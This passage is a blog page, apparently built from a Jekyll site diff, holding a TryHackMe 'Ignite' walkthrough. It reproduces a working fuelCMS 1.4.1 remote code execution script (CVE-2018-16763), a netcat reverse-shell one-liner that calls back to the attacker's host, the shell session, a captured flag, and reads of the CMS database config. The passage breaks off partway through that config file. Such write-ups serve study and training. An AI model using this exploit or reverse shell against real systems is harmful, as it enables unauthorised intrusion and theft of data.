@@ -1,0 +1,1102 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.20.2 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>TryHackMe - Ignite | Tri Wanda Septian’s Blog</title>
+<meta name="description" content="A new start-up has a few issues with their web server.">
+
+
+  <meta name="author" content="Tri Wanda Septian">
+  
+  <meta property="article:author" content="Tri Wanda Septian">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Tri Wanda Septian's Blog">
+<meta property="og:title" content="TryHackMe - Ignite">
+<meta property="og:url" content="http://localhost:4000/tryhackme/thm-ignite/">
+
+
+  <meta property="og:description" content="A new start-up has a few issues with their web server.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/avatar_backup.png">
+
+
+
+  <meta name="twitter:site" content="@twseptian_">
+  <meta name="twitter:title" content="TryHackMe - Ignite">
+  <meta name="twitter:description" content="A new start-up has a few issues with their web server.">
+  <meta name="twitter:url" content="http://localhost:4000/tryhackme/thm-ignite/">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+      <meta name="twitter:image" content="http://localhost:4000/assets/images/avatar_backup.png">
+    
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2020-06-14T00:00:00+07:00">
+
+
+
+  <meta property="article:modified_time" content="2020-06-14T14:58:30+07:00">
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/tryhackme/thm-ignite/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Tri Wanda Septian's Blog and Stuff",
+      "url": "http://localhost:4000/",
+      "sameAs": ["https://twitter.com/twsepian_","https://github.com/twseptian"]
+    
+  }
+</script>
+
+
+  <meta name="google-site-verification" content="KJV9Ip5Mlud9lmDhN6pzfrcplPaoPSnsaOptFO6aIwE" />
+
+
+  <meta name="msvalidate.01" content="A990426F952EA8940B6F2C13C11817E3">
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Tri Wanda Septian's Blog Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+
+    <!-- start custom head snippets -->
+<meta name="msvalidate.01" content="A990426F952EA8940B6F2C13C11817E3" />
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+<link rel="apple-touch-icon" sizes="120x120" href="/assets/images/favicon/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/favicon/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/favicon/favicon-16x16.png">
+<link rel="manifest" href="/assets/images/favicon/site.webmanifest">
+<link rel="mask-icon" href="/assets/images/favicon/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/ava.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          Tri Wanda Septian
+          <span class="site-subtitle">#neverstoplearning #lifelonglearning</span>
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/">posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/">tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/">categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/">about me</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+    
+    <aside class="sidebar__top">
+      <a href="#site-nav"><i class="fas fa-chevron-circle-up fa-2x"></i></a>
+      </aside>
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="/assets/images/avatar_backup.png" alt="Tri Wanda Septian" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Tri Wanda Septian</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Researcher, Infosec practioner,<br />CTF Player, Perpetual Learner.</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Indonesia</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twseptian.github.io" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+          
+        
+          
+            <li><a href="mailto:twseptian@gmail.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope" aria-hidden="true"></i><span class="label">Email</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/twseptian" rel="nofollow noopener noreferrer"><i class="fab fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://gitlab.com/twseptian/" rel="nofollow noopener noreferrer"><i class="fab fa-gitlab" aria-hidden="true"></i><span class="label">GitLab</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/twseptian_" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://www.linkedin.com/in/twseptian/" rel="nofollow noopener noreferrer"><i class="fab fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="TryHackMe - Ignite">
+    <meta itemprop="description" content="  A new start-up has a few issues with their web server.">
+    <meta itemprop="datePublished" content="2020-06-14T00:00:00+07:00">
+    <meta itemprop="dateModified" content="2020-06-14T14:58:30+07:00">
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">TryHackMe - Ignite
+</h1>
+          
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2020-06-14T00:00:00+07:00">June 14, 2020</time>
+      </span>
+    
+    
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          7 minute read
+        
+      </span>
+        
+  </p>
+  
+
+
+
+          <section class="page__share">
+  
+    <!--<h4 class="page__share-title">Share on</h4>-->
+  
+
+  <a href="https://twitter.com/intent/tweet?via=twseptian_&text=TryHackMe+-+Ignite%20http%3A%2F%2Flocalhost%3A4000%2Ftryhackme%2Fthm-ignite%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Ftryhackme%2Fthm-ignite%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Ftryhackme%2Fthm-ignite%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i></a>
+  
+  <a href="https://www.buymeacoffee.com/twseptian"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=☕&slug=twseptian&button_colour=5F7FFF&font_colour=ffffff&font_family=Lato&outline_colour=000000&coffee_colour=FFDD00" width="160",height="160"></a>
+</section>
+
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> Contents</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#network-scanning">Network Scanning</a></li>
+  <li><a href="#enumeration">Enumeration</a>
+    <ul>
+      <li><a href="#reverse-shell">Reverse Shell</a></li>
+      <li><a href="#1-usertxt">#1 User.txt</a></li>
+      <li><a href="#2-roottxt">#2 Root.txt</a></li>
+    </ul>
+  </li>
+  <li><a href="#references">References</a></li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <blockquote>
+  <p>A new start-up has a few issues with their web server.</p>
+</blockquote>
+
+<h2 id="network-scanning">Network Scanning</h2>
+
+<p>Nmap output</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.80 scan initiated Sun Jun 14 20:38:52 2020 as: nmap -sC -sV -T4 -A -oN ignite.nmap 10.10.223.81</span>
+Nmap scan report <span class="k">for </span>10.10.223.81
+Host is up <span class="o">(</span>0.23s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-robots.txt: 1 disallowed entry 
+|_/fuel/
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Welcome to FUEL CMS
+No exact OS matches <span class="k">for </span>host <span class="o">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="o">)</span><span class="nb">.</span>
+TCP/IP fingerprint:
+OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>7.80%E<span class="o">=</span>4%D<span class="o">=</span>6/14%OT<span class="o">=</span>80%CT<span class="o">=</span>1%CU<span class="o">=</span>36607%PV<span class="o">=</span>Y%DS<span class="o">=</span>2%DC<span class="o">=</span>T%G<span class="o">=</span>Y%TM<span class="o">=</span>5EE628A
+OS:7%P<span class="o">=</span>x86_64-pc-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>108%GCD<span class="o">=</span>1%ISR<span class="o">=</span>108%TI<span class="o">=</span>Z%II<span class="o">=</span>I%TS<span class="o">=</span>A<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>1
+OS:08%GCD<span class="o">=</span>1%ISR<span class="o">=</span>108%TI<span class="o">=</span>Z%CI<span class="o">=</span>I%II<span class="o">=</span>I%TS<span class="o">=</span>A<span class="o">)</span>OPS<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M508ST11NW6%O2<span class="o">=</span>M508ST11NW6%O
+OS:3<span class="o">=</span>M508NNT11NW6%O4<span class="o">=</span>M508ST11NW6%O5<span class="o">=</span>M508ST11NW6%O6<span class="o">=</span>M508ST11<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>68DF%W2<span class="o">=</span>
+OS:68DF%W3<span class="o">=</span>68DF%W4<span class="o">=</span>68DF%W5<span class="o">=</span>68DF%W6<span class="o">=</span>68DF<span class="o">)</span>ECN<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>6903%O<span class="o">=</span>M508NNSN
+OS:W6%CC<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%S<span class="o">=</span>O%A<span class="o">=</span>S+%F<span class="o">=</span>AS%RD<span class="o">=</span>0%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%D
+OS:F<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T5<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O
+OS:<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W
+OS:<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>N%T<span class="o">=</span>40%IPL<span class="o">=</span>164%UN<span class="o">=</span>0%RIPL<span class="o">=</span>G%RID<span class="o">=</span>G%R
+OS:IPCK<span class="o">=</span>G%RUCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T<span class="o">=</span>40%CD<span class="o">=</span>S<span class="o">)</span>
+
+Network Distance: 2 hops
+
+TRACEROUTE <span class="o">(</span>using port 1720/tcp<span class="o">)</span>
+HOP RTT       ADDRESS
+1   217.58 ms 10.9.0.1
+2   257.75 ms 10.10.223.81
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Sun Jun 14 20:39:51 2020 -- 1 IP address (1 host up) scanned in 58.62 seconds</span>
+</code></pre></div></div>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p><img src="/assets/images/thm-ignite/fuel-cms.png" alt="fuelcms" /></p>
+
+<p>searchploit</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─twseptian@twsterlab ~ 
+╰─<span class="nv">$ </span>searchsploit fuel cms
+<span class="nt">------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                                                      |  Path
+<span class="nt">------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+fuelCMS 1.4.1 - Remote Code Execution                                                                                               | linux/webapps/47138.py
+<span class="nt">------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+╭─twseptian@twsterlab ~ 
+╰─<span class="nv">$ </span>
+╭─twseptian@twsterlab ~ 
+╰─<span class="nv">$ </span>searchsploit <span class="nt">-m</span> linux/webapps/47138.py
+  Exploit: fuelCMS 1.4.1 - Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/47138
+     Path: /usr/share/exploitdb/exploits/linux/webapps/47138.py
+File Type: HTML document, ASCII text, with CRLF line terminators
+
+Copied to: /twseptian/47138.py
+
+
+╭─twseptian@twsterlab ~ 
+╰─<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>exploitdb</p>
+
+<p><img src="/assets/images/thm-ignite/fuel-cms-exploitdb.png" alt="fuelcms-exploitdb" /></p>
+
+<p>python script</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Exploit Title: fuelCMS 1.4.1 - Remote Code Execution
+# Date: 2019-07-19
+# Exploit Author: 0xd0ff9
+# Vendor Homepage: https://www.getfuelcms.com/
+# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
+# Version: &lt;= 1.4.1
+# Tested on: Ubuntu - Apache2 - php5
+# CVE : CVE-2018-16763
+</span>
+
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">urllib</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">"http://10.10.223.81:80"</span>
+<span class="k">def</span> <span class="nf">find_nth_overlapping</span><span class="p">(</span><span class="n">haystack</span><span class="p">,</span> <span class="n">needle</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
+    <span class="n">start</span> <span class="o">=</span> <span class="n">haystack</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">needle</span><span class="p">)</span>
+    <span class="k">while</span> <span class="n">start</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">n</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">start</span> <span class="o">=</span> <span class="n">haystack</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">needle</span><span class="p">,</span> <span class="n">start</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">n</span> <span class="o">-=</span> <span class="mi">1</span>
+    <span class="k">return</span> <span class="n">start</span>
+
+<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+  <span class="n">xxxx</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">'cmd:'</span><span class="p">)</span>
+  <span class="n">burp0_url</span> <span class="o">=</span> <span class="n">url</span><span class="o">+</span><span class="s">"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"</span><span class="o">+</span><span class="n">urllib</span><span class="p">.</span><span class="n">quote</span><span class="p">(</span><span class="n">xxxx</span><span class="p">)</span><span class="o">+</span><span class="s">"%27%29%2b%27"</span>
+  <span class="n">proxy</span> <span class="o">=</span> <span class="p">{</span><span class="s">"http"</span><span class="p">:</span><span class="s">"http://127.0.0.1:8080"</span><span class="p">}</span>
+  <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxy</span><span class="p">)</span>
+
+  <span class="n">html</span> <span class="o">=</span> <span class="s">"&lt;!DOCTYPE html&gt;"</span>
+  <span class="n">htmlcharset</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">html</span><span class="p">)</span>
+
+  <span class="n">begin</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">20</span><span class="p">]</span>
+  <span class="n">dup</span> <span class="o">=</span> <span class="n">find_nth_overlapping</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">,</span><span class="n">begin</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span>
+
+  <span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">dup</span><span class="p">]</span>
+</code></pre></div></div>
+
+<p>let’s combine with Burpsuite to forward our requests</p>
+
+<p><img src="/assets/images/thm-ignite/exe1.png" alt="run01" /></p>
+
+<p>and click forward on Burpsuite, and we can get some response</p>
+
+<p><img src="/assets/images/thm-ignite/exe2.png" alt="run02" /></p>
+
+<h3 id="reverse-shell">Reverse Shell</h3>
+
+<p>I used <code class="language-plaintext highlighter-rouge">netcat</code> reverse shell command line from http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">rm</span> /tmp/f <span class="p">;</span> <span class="nb">mkfifo</span> /tmp/f <span class="p">;</span> <span class="nb">cat</span> /tmp/f | /bin/sh <span class="nt">-i</span> 2&gt;&amp;1 | nc 10.9.19.3 4444 <span class="o">&gt;</span>/tmp/f
+</code></pre></div></div>
+<p>you can change with your host IP address, in this case, my IP address is <code class="language-plaintext highlighter-rouge">10.9.19.3</code> and opens another terminal with <code class="language-plaintext highlighter-rouge">nc -lvnp 4444</code></p>
+
+<p><img src="/assets/images/thm-ignite/exe3.png" alt="run03" /></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─twseptian@twsterlab ~ 
+╰─<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 4444
+Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.223.81.
+Ncat: Connection from 10.10.223.81:47538.
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ whoami
+www-data
+$ /usr/bin/script -qc /bin/shell /dev/null  
+www-data@ubuntu:/var/www/html$ 
+</span></code></pre></div></div>
+
+<h3 id="1-usertxt">#1 User.txt</h3>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/var/www/html<span class="nv">$ </span><span class="nb">pwd
+pwd</span>
+/var/www/html
+www-data@ubuntu:/var/www/html<span class="nv">$ </span><span class="nb">cd</span> /home
+<span class="nb">cd</span> /home                                                                                                                                                              
+www-data@ubuntu:/home<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>                                                                                                                                         
+<span class="nb">ls</span> <span class="nt">-la</span>                                                                                                                                                                
+total 12                                                                                                                                                              
+drwxr-xr-x  3 root     root     4096 Jul 26  2019 <span class="nb">.</span>                                                                                                                   
+drwxr-xr-x 24 root     root     4096 Jul 26  2019 ..                                                                                                                  
+drwx--x--x  2 www-data www-data 4096 Jul 26  2019 www-data                                                                                                            
+www-data@ubuntu:/home<span class="nv">$ </span><span class="nb">cd </span>www-data                                                                                                                                    
+<span class="nb">cd </span>www-data                                                                                                                                                           
+www-data@ubuntu:/home/www-data<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>                                                                                                                                
+<span class="nb">ls</span> <span class="nt">-la</span>                                                                                                                                                                
+total 12                                                                                                                                                              
+drwx--x--x 2 www-data www-data 4096 Jul 26  2019 <span class="nb">.</span>                                                                                                                    
+drwxr-xr-x 3 root     root     4096 Jul 26  2019 ..                                                                                                                   
+<span class="nt">-rw-r--r--</span> 1 root     root       34 Jul 26  2019 flag.txt                                                                                                             
+www-data@ubuntu:/home/www-data<span class="nv">$ </span><span class="nb">cat </span>flag.txt                                                                                                                          
+<span class="nb">cat </span>flag.txt                                                                                                                                                          
+6470e394cbf6dab6a91682cc8585059b                                                                                                                                      
+www-data@ubuntu:/home/www-data<span class="nv">$ </span>
+</code></pre></div></div>
+<p>ANS: <code class="language-plaintext highlighter-rouge">6470e394cbf6dab6a91682cc8585059b</code></p>
+
+<h3 id="2-roottxt">#2 Root.txt</h3>
+
+<p>let’s come back to the browser, and we can see the information about <code class="language-plaintext highlighter-rouge">How to Install the Database.</code></p>
+
+<p><img src="/assets/images/thm-ignite/fuel-cms-installdb.png" alt="fuel-cms-installdb" /></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/home/www-data<span class="nv">$ </span><span class="nb">cd</span> /var/www/html                                                                                                                      
+<span class="nb">cd</span> /var/www/html                                                                                                                                                      
+www-data@ubuntu:/var/www/html<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>                                                                                                                                  
+<span class="nb">ls</span> <span class="nt">-l</span>                                                                                                                                                                 
+total 40
+<span class="nt">-rwxrwxrwx</span> 1 root root  1427 Jul 26  2019 README.md
+drwxrwxrwx 9 root root  4096 Jul 26  2019 assets
+<span class="nt">-rwxrwxrwx</span> 1 root root   193 Jul 26  2019 composer.json
+<span class="nt">-rwxrwxrwx</span> 1 root root  6502 Jul 26  2019 contributing.md
+drwxrwxrwx 9 root root  4096 Jul 26  2019 fuel
+<span class="nt">-rwxrwxrwx</span> 1 root root 11802 Jul 26  2019 index.php
+<span class="nt">-rwxrwxrwx</span> 1 root root    30 Jul 26  2019 robots.txt
+www-data@ubuntu:/var/www/html<span class="nv">$ </span><span class="nb">cat </span>fuel/application/config/database.php
+<span class="nb">cat </span>fuel/application/config/database.php
+&lt;?php
+defined<span class="o">(</span><span class="s1">'BASEPATH'</span><span class="o">)</span> OR <span class="nb">exit</span><span class="o">(</span><span class="s1">'No direct script access allowed'</span><span class="o">)</span><span class="p">;</span>
+
+/<span class="k">*</span>
+| <span class="nt">-------------------------------------------------------------------</span>
+| DATABASE CONNECTIVITY SETTINGS
+| <span class="nt">-------------------------------------------------------------------</span>
+| This file will contain the settings needed to access your database.
+|
+| For <span class="nb">complete </span>instructions please consult the <span class="s1">'Database Connection'</span>
+| page of the User Guide.
+|
+| <span class="nt">-------------------------------------------------------------------</span>
+| EXPLANATION OF VARIABLES
+| <span class="nt">-------------------------------------------------------------------</span>
+|
+|       <span class="o">[</span><span class="s1">'dsn'</span><span class="o">]</span>      The full DSN string describe a connection to the database.
+|       <span class="o">[</span><span class="s1">'hostname'</span><span class="o">]</span> The <span class="nb">hostname </span>of your database server.
+|       <span class="o">[</span><span class="s1">'username'</span><span class="o">]</span> The username used to connect to the database
+|       <span class="o">[</span><span class="s1">'password'</span><span class="o">]</span> The password used to connect to the database
+|       <span class="o">[</span><span class="s1">'database'</span><span class="o">]</span> The name of the database you want to connect to
+|       <span class="o">[</span><span class="s1">'dbdriver'</span><span class="o">]</span> The database driver. e.g.: mysqli.
+|                       Currently supported:
+|                                cubrid, ibase, mssql, mysql, mysqli, oci8,
+|                                odbc, pdo, postgre, sqlite, sqlite3, sqlsrv
+|       <span class="o">[</span><span class="s1">'dbprefix'</span><span class="o">]</span> You can add an optional prefix, which will be added
+|                                to the table name when using the  Query Builder class
+|       <span class="o">[</span><span class="s1">'pconnect'</span><span class="o">]</span> TRUE/FALSE - Whether to use a persistent connection
+|       <span class="o">[</span><span class="s1">'db_debug'</span><span class="o">]</span> TRUE/FALSE - Whether database errors should be displayed.
+|       <span class="o">[</span><span class="s1">'cache_on'</span><span class="o">]</span> TRUE/FALSE - Enables/disables query caching
+|       <span class="o">[</span><span class="s1">'cachedir'</span><span class="o">]</span> The path to the folder where cache files should be stored
+|       <span class="o">[</span><span class="s1">'char_set'</span><span class="o">]</span> The character <span class="nb">set </span>used <span class="k">in </span>communicating with the database
